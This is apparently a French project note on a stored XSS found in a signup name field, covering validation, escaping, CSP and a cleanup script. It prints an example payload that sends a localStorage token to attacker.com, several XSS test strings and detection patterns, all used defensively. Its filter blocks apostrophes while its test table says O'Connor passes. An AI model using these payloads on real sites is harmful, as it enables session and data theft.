# 🛡️ Protection contre les Attaques XSS

## 🚨 PROBLÈME DÉTECTÉ

Quelqu'un a réussi à injecter du code JavaScript dans le champ "Nom complet" :
```html
<script>alert("TEST")</script>
```

C'est une **attaque XSS (Cross-Site Scripting)** qui permet à un attaquant d'exécuter du code malveillant dans le navigateur des autres utilisateurs.

---

## ⚠️ DANGERS DES ATTAQUES XSS

### Ce qu'un attaquant peut faire :
1. **Voler des tokens d'authentification** (localStorage, cookies)
2. **Voler des données personnelles** des utilisateurs
3. **Rediriger vers des sites malveillants**
4. **Modifier le contenu de la page**
5. **Installer des keyloggers** (enregistrer les frappes clavier)
6. **Effectuer des actions** au nom de l'utilisateur

### Exemple d'attaque réelle :
```javascript
// Voler le token et l'envoyer à un serveur malveillant
<script>
  fetch('https://attacker.com/steal?token=' + localStorage.getItem('token'))
</script>
```

---

## ✅ PROTECTIONS AJOUTÉES

### 1. **Validation Frontend** (RegisterPage.tsx)

#### Blocage des caractères dangereux :
```typescript
const dangerousCharsRegex = /[<>\"'\/\\]/;
if (dangerousCharsRegex.test(name)) {
  // BLOQUÉ !
}
```

#### Validation du format :
```typescript
const validNameRegex = /^[a-zA-ZÀ-ÿ\s\-']{2,50}$/;
// Autorise uniquement : lettres, espaces, tirets, apostrophes
```

#### Blocage des mots-clés suspects :
```typescript
const suspiciousKeywords = [
  'script', 'alert', 'prompt', 'confirm', 
  'eval', 'function', 'javascript', 
  'onclick', 'onerror', 'onload'
];
```

---

### 2. **Validation Backend** (validationMiddleware.js)

Double validation côté serveur pour empêcher les contournements :
- Même validation que le frontend
- Nettoyage automatique (trim)
- Rejet des requêtes suspectes

---

### 3. **Utilitaires de Sécurité** (securityUtils.ts)

#### Échappement HTML :
```typescript
escapeHtml('<script>alert("XSS")</script>')
// Résultat : &lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;
```

#### Détection de code suspect :
```typescript
containsSuspiciousCode('<script>alert("XSS")</script>')
// Résultat : true (BLOQUÉ)
```

---

## 🔒 COMMENT ÇA FONCTIONNE

### Avant (Vulnérable) :
```
Utilisateur tape : <script>alert("XSS")</script>
     ↓
Stocké dans la base de données tel quel
     ↓
Affiché sur la page
     ↓
💥 CODE EXÉCUTÉ ! (Attaque réussie)
```

### Après (Protégé) :
```
Utilisateur tape : <script>alert("XSS")</script>
     ↓
Validation frontend : BLOQUÉ ❌
Message : "Le nom contient des caractères non autorisés"
     ↓
Inscription refusée
```

---

## 🧪 TESTS DE SÉCURITÉ

### Tentatives d'injection bloquées :

| Tentative | Résultat |
|-----------|----------|
| `<script>alert("XSS")</script>` | ❌ BLOQUÉ |
| `<img src=x onerror=alert(1)>` | ❌ BLOQUÉ |
| `javascript:alert(1)` | ❌ BLOQUÉ |
| `"><script>alert(1)</script>` | ❌ BLOQUÉ |
| `Jean Dupont` | ✅ ACCEPTÉ |
| `Marie-Claire O'Connor` | ✅ ACCEPTÉ |
| `José García` | ✅ ACCEPTÉ |

---

## 📊 NIVEAUX DE PROTECTION

### Niveau 1 : Validation Frontend ✅
- Bloque les tentatives avant l'envoi
- Feedback immédiat à l'utilisateur
- Réduit la charge serveur

### Niveau 2 : Validation Backend ✅
- Double vérification côté serveur
- Empêche les contournements (API directe)
- Logs des tentatives suspectes

### Niveau 3 : Échappement HTML ✅
- Affichage sécurisé des données
- Même si du code passe, il ne s'exécute pas
- Protection en profondeur

### Niveau 4 : Content Security Policy (CSP) ✅
- Headers HTTP de sécurité (Helmet)
- Bloque l'exécution de scripts inline
- Protection au niveau navigateur

---

## 🔍 DÉTECTION D'ATTAQUES

### Patterns détectés automatiquement :
```javascript
// Balises HTML
/<script/i, /<iframe/i, /<object/i, /<embed/i

// Événements JavaScript
/on\w+\s*=/i  // onclick, onerror, onload, etc.

// Protocoles dangereux
/javascript:/i, /data:/i

// Fonctions dangereuses
/eval\(/i, /alert\(/i, /prompt\(/i, /confirm\(/i
```

---

## 🛠️ ACTIONS CORRECTIVES

### Pour nettoyer les données existantes :

```javascript
// Script à exécuter sur la base de données
db.users.find({ name: /<|>|script/i }).forEach(user => {
  // Nettoyer le nom
  const cleanName = user.name.replace(/<[^>]*>/g, '');
  db.users.updateOne(
    { _id: user._id },
    { $set: { name: cleanName } }
  );
});
```

---

## 📚 BONNES PRATIQUES

### ✅ À FAIRE :
1. **Toujours valider** les entrées utilisateur
2. **Échapper le HTML** lors de l'affichage
3. **Utiliser des bibliothèques** de sanitization
4. **Implémenter CSP** (Content Security Policy)
5. **Logger les tentatives** d'injection
6. **Éduquer les utilisateurs** sur les noms valides

### ❌ À NE PAS FAIRE :
1. Faire confiance aux données utilisateur
2. Afficher du HTML brut sans échappement
3. Utiliser `dangerouslySetInnerHTML` sans sanitization
4. Désactiver les validations pour "simplifier"
5. Ignorer les warnings de sécurité

---

## 🚀 DÉPLOIEMENT

### Étapes :
1. ✅ Code de protection ajouté
2. ✅ Tests de validation effectués
3. 🔄 Commit et push en cours
4. ⏳ Redéploiement automatique
5. ⏳ Nettoyage des données existantes (manuel)

---

## 📞 RESSOURCES

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [MDN: Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [Google: XSS Game](https://xss-game.appspot.com/) - Pour apprendre

---

**🛡️ Votre application est maintenant protégée contre les attaques XSS !**
